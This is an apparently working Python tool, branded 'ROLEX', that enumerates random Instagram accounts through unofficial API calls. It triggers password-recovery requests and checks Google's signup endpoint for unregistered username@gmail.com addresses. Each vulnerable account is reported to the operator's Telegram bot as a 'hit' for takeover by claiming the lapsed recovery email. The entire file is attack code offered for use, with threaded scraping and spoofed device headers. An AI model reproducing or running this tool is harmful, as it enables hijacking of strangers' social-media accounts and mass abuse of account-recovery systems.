
print("\x1b[1;39m━" * 60)
import os
try:import cfonts;from cfonts import render
except:os.system("pip install python-cfonts")
try:import requests
except:os.system("pip install requests")
try:from bs4 import BeautifulSoup
except:os.system("pip install bs4")
try:import json,re,os,sys
except:os.system("pip install json")
try:from datetime import datetime
except:os.system("pip install re")
try:from user_agent import generate_user_agent
except:os.system("pip install user_agent")
try:from user_agent import generate_user_agent as ggb
except:os.system("pip install json")
try:from rich.console import Console
except:os.system("pip install rich")
try:from rich.panel import Panel
except:os.system("pip install threading")
try:import threading,webbrowser
except:os.system("pip install random")
try:import random
except:os.system("pip install hashlib")
try:import hashlib
except:os.system("pip install uuid")
try:import uuid
except:os.system("pip install time")
try:from colorama import Fore, Style
except:os.system("pip install colorama")
import sys
import os, sys, subprocess, importlib.util, time
from requests import post as pp
from random import choice as cc
from random import randrange as rr
import time
def print_slowly(text, delay=0.1):
   for char in text:
       print(char, end='', flush=True)
       time.sleep(delay)
   print()
total = 0
hits = 0
badinsta = 0
bademail = 0
goodig = 0
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
import time
import time
import os,random
try:from cfonts import render
except:os.system('pip install python-cfonts');from cfonts import render
try:from colorama import Fore,Style
except:os.system('pip install colorama');from colorama import Fore,Style
def random_color():return random.choice(['magenta','cyan','yellow','red','blue','green'])
def slow_print(text,delay=.05):
	for A in text:print(A,end='',flush=True);time.sleep(delay)
	print()
def show_banner():A=render('ROLEX',font='block',colors=[random_color()],align='left',space=False);print(A)
show_banner()
print_slowly(' \x1b[41m\x1b[1;37m</> 𝐂𝐑𝐀𝐗𝐘 𝐀𝐍𝐃 #𝐑𝐀𝐃𝐇𝐄𝐘 \x1b[0m\x1b[1;97m ')
time.sleep(1.5)
import webbrowser 
import time
def check_expiry():
    expiry_url = "https://raw.githubusercontent.com/boloradhey/EXPIRY/refs/heads/main/expiryuser.txt"
    try:
        response = requests.get(expiry_url, timeout=5)
        response.raise_for_status()
        expiry_str = response.text.strip()
        expiry_datetime = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiry_datetime:
            print(f"{Fore.RED}THIS TOOL TRIAL IS ENDED NOW DM @boloradhey FOR RENEWAL")
            exit(1)
        else:
            print(f"{Fore.GREEN}WELCOME TO THE TOOL !! 🦚")
    except requests.exceptions.RequestException as e:
        print(f"⚠Failed to check expiry (using offline fallback): {e}")
check_expiry()
Token = input('BOT TOKEN : ')
print("\x1b[1;39m-" * 60)
ID = input('CHAT ID : ')

def pppp():
    global badinsta,hits,bademail,goodig
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    os.system('cls' if os.name == 'nt' else 'clear')
    output = f"\rHIT:{hits} | CHECK:{badinsta} | MAILS:{bademail} | GOOD:{goodig}\r"
    sys.stdout.write(output)
    sys.stdout.flush()
yy = 'abcdefghijklmnopqrstuvwxyz'
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w',encoding='utf-8') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()

def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='no REST !'
  return r

def date(Id):
    try:
        uid = int(Id)
        if 1 < uid < 1279000:
            return 2010
        elif 1279001 <= uid < 17750000:
            return 2011
        elif 17750001 <= uid < 279760000:
            return 2012
        elif 279760001 <= uid < 900990000:
            return 2013
        elif 900990001 <= uid < 1629010000:
            return 2014
        elif 1629010001 <= uid < 2369359761:
            return 2015
        elif 2369359762 <= uid < 4239516754:
            return 2016
        elif 4239516755 <= uid < 6345108209:
            return 2017
        elif 6345108210 <= uid < 10016232395:
            return 2018
        elif 10016232396 <= uid < 27238602159:
            return 2019
        elif 27238602160 <= uid < 43464475395:
            return 2020
        elif 43464475396 <= uid < 50289297647:
            return 2021
        elif 50289297648 <= uid < 57464707082:
            return 2022
        elif 57464707083 <= uid < 65000000000:
            return 2023
        elif 65000000001 <= uid < 80000000000:
            return 2024
        elif 80000000001 <= uid < 100000000000:
            return 2025
        else:
            return "2025+"
    except Exception:
        return 'unknown'

def InfoAcc(username, gg):
    global total

    rr= infoinsta.get(username,{})

    Id = rr.get('pk', None)
    full_name = rr.get('full_name', None)
    fows = rr.get('follower_count', None)
    fowg = rr.get('following_count', None)
    pp = rr.get('media_count', None)
    isPraise = rr.get('is_private', None)
    bio = rr.get('biography', None)
    is_verified = rr.get('is_verified', None)
    bizz = rr.get('is_business', None)
    try:
        if (fows and pp):
            if (int(fows) >= 10 and int(pp) >= 2):
                meta = True
            else:
                meta = False
        else:
            meta = False
    except:
        meta=False


    total += 1
    ss = f'''
#𝐑𝐀𝐃𝐇𝐄𝐘 𝐒𝐄𝐍𝐓 𝐘𝐎𝐔 𝐀 𝐇𝐈𝐓    
✦ ──── ✦ ──── ✦ ──── ✦ 
🌀 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 » @{username}  
📧 𝐄𝐦𝐚𝐢𝐥 » {username}@gmail.com  
🔄 𝐑𝐞𝐬𝐞𝐭 𝐂𝐨𝐝𝐞 » {rest(username)}  
👥 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 » {fows}  
➡️ 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 » {fowg}  
📌 𝐏𝐨𝐬𝐭𝐬 » {pp}  
📆 𝐘𝐞𝐚𝐫 » {date(Id)}  
ℹ️ 𝐌𝐞𝐭𝐚 » {meta}  
🔗 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 » instagram.com/{username}  
✨ 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 » @boloradhey  
✦ ──── ✦ ──── ✦ ──── ✦  
'''
    with open('radhey.txt','a') as f:f.write(f'{ss}\n')
    try:
        try:
            requests.get(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={ss}")
            inline_keyboard=[[{'text':'SS','url':'http://t.me/sayrolex'},{'text':'CHANNEL','url':'https://t.me/+Ubj_lu-pz9k1ZGFl'}]]
            data={'text':ss,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})}
            data['chat_id']=ID
            requests.get(f"https://api.telegram.org/bot{Token}/sendMessage",params=data)
        except Exception as e:
            print(f"Hii") 
    except:
        print(f"Hii")
def Gmail(email):
    global bademail, hits
    try:
        if '@' in email:
            email = str(email).split('@')[0]

        try:
            o = open('tl.txt', 'r').read().splitlines()[0]
        except:
            o = open('tl.txt', 'r').read().splitlines()[0]

        tl, host = o.split('//')

        cookies = {
        '__Host-GAPS': host
    }
        headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
        'user-agent': ggb(),
    }
        params = {
        'TL': tl,
    }
        data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in str(response.text):
            hits += 1
            pppp()
            if '@' not in email:
                ok = email + '@gmail.com'
                username, gg = ok.split('@')
                InfoAcc(username, gg)
            else:
                username, gg = email.split('@')
                InfoAcc(username, gg)
        else: 
          bademail+=1
          pppp()
    except:''


def format_number(value):
    value = float(value)
    if value >= 1000000:
        return f"{value / 1000000:.1f}m"
    elif value >= 1000:
        return f"{value / 1000:.1f}k"
    return str(int(value))

def check_on(email):
    global goodig, badinsta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    headers = {
        'User-Agent': ua,
        'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    }
    data = {
        'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
            '_csrftoken': '0pHLWZO6FhgX1iQKjjwN3GvgS0fqUK58',
            'adid': uui,
            'guid': uui,
            'device_id': device_id,
            'query': email
        }),
        'ig_sig_key_version': '4',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
 
    if email in response:
        Gmail(email)
        

        goodig += 1
        pppp()
    else:
        badinsta += 1
        pppp()



infoinsta = {}
ids=[]
def rand_ids(bbk,Ido):  
  Id= str(random.randrange(bbk, Ido))
  if Id not in ids:
    ids.append(Id)
    return Id
  else:
    rand_ids(bbk,Ido)
def uuu():
 while True:
  try:

    domain='@gmail.com'
    bbk = 2369359762
    Ido = 100000000000
    while True:      
      rnd=str(random.randint(150, 999))
      user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
      Id = rand_ids(bbk,Ido)
      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
      headers = {
    'accept': '*/*',
    'accept-language': 'en,en-US;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://www.instagram.com',
    'priority': 'u=1, i',
    'referer': 'https://www.instagram.com/cristiano/following/',
    'user-agent': user_agent,
    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
    'x-fb-lsd': lsd,
}
      data = {
    'lsd': lsd,
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
    'variables': '{"userID":"'+str(Id)+'","username":"cristiano"}',
    'server_timestamps': 'true',
    'doc_id': '7717269488336001',
}

      response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
      username = response.json().get('data', {}).get('user', {}).get('username')
      infoinsta[username] = response.json().get('data', {}).get('user', {})
      rr = infoinsta.get(username,{})
      fows = rr.get('follower_count', None)
      if fows >= 40:
	      email = username + domain
	      check_on(email)
          
  except Exception as e:''

    
threads = []
def printing():
    
    for i in range(125):
        t = threading.Thread(target=uuu)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
printing()
